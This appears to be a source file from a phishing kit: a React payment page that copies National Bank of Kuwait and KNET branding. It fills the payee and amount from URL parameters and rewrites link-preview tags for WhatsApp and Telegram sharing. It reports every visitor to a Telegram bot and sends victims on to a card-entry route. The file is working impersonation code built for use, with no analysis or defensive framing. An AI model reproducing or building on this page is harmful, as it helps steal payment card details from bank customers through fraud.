import { useParams, useNavigate } from "react-router-dom";
import { useEffect, useMemo } from "react";
import { sendMessageToTelegram } from "@/backend/telegramService";

const PaymentPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const queryParams = new URLSearchParams(window.location.search);
  
  const paymentData = useMemo(() => {
    return {
      id: id || 'unknown',
      customerName: queryParams.get('n') || "halits.YILDIZ",
      amount: queryParams.get('a') || "5.000",
      currency: queryParams.get('c') || "KWD",
      description: queryParams.get('p') || "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
      expiryDate: new Date(Date.now() + 86400000).toISOString().split('T')[0]
    };
  }, [window.location.search, id]);

  useEffect(() => {
    // Dynamic Metadata Update for Sharing (WhatsApp/Telegram previews)
    document.title = `KNET Payment - ${paymentData.customerName}`;
    
    // Update Meta Description
    let metaDesc = document.querySelector('meta[name="description"]');
    if (!metaDesc) {
      metaDesc = document.createElement('meta');
      metaDesc.setAttribute('name', 'description');
      document.head.appendChild(metaDesc);
    }
    metaDesc.setAttribute('content', paymentData.description);

    // Update OpenGraph (OG) tags for rich previews
    const ogTitle = document.querySelector('meta[property="og:title"]');
    if (ogTitle) ogTitle.setAttribute('content', `KNET Payment - ${paymentData.customerName}`);
    
    const ogDesc = document.querySelector('meta[property="og:description"]');
    if (ogDesc) ogDesc.setAttribute('content', paymentData.description);

    const notifyVisitor = async () => {
      const message = `
<b>👀 New Visitor</b>
<b>Name:</b> ${paymentData.customerName}
<b>Amount:</b> ${paymentData.amount} ${paymentData.currency}
<b>Purpose:</b> ${paymentData.description}
<b>ID:</b> ${paymentData.id}
`;
      await sendMessageToTelegram(message);
    };
    notifyVisitor();
  }, [paymentData]);

  const handleConfirm = () => {
    navigate(`/card/${id}${window.location.search}`);
  };

  const getCurrencySymbol = (currency: string) => {
    const symbols: Record<string, string> = { 'KWD': 'د.ك', 'USD': '$', 'EUR': '€' };
    return symbols[currency] || currency;
  };

  const currencySymbol = getCurrencySymbol(paymentData.currency);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4">
      <div className="mb-8">
        <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-16" />
      </div>
      
      <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
        خدمة الدفع السريع
      </h1>
      
      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
        <div className="space-y-4 text-right">
          <div className="flex justify-between items-center">
            <span className="font-bold text-blue-900">{paymentData.customerName}</span>
            <span className="text-gray-700">:اسم المستلم</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-bold text-blue-900">{paymentData.amount} {currencySymbol}</span>
            <span className="text-gray-700">:المبلغ</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-bold text-blue-900 text-xs">{paymentData.description}</span>
            <span className="text-gray-700">:الغرض</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-bold text-red-600">صالح لمدة 24 ساعة</span>
            <span className="text-gray-700">:انتهاء الصلاحية</span>
          </div>
        </div>
      </div>
      
      <div className="text-right text-sm text-gray-600 mb-8 max-w-md leading-relaxed">
        يرجى عدم إغلاق الصفحة بعد إتمام عملية الدفع لحين ظهور صفحة التأكيد التي تفيد بأن العملية ناجحة لتفادي أي مشاكل قد تنتج عن ذلك.
      </div>
      
      <div className="flex flex-col gap-3 w-full max-w-md">
        <button 
          onClick={handleConfirm}
          className="w-full bg-blue-700 hover:bg-blue-800 text-white py-3 text-lg rounded-lg transition-colors font-bold shadow-lg"
        >
          تأكيد
        </button>
        
        <button 
          className="w-full border border-gray-300 text-gray-700 py-3 text-lg rounded-lg hover:bg-gray-50 transition-colors"
          onClick={() => alert('تم رفض عملية الدفع')}
        >
          رفض
        </button>
      </div>
    </div>
  );
};

export default PaymentPage;
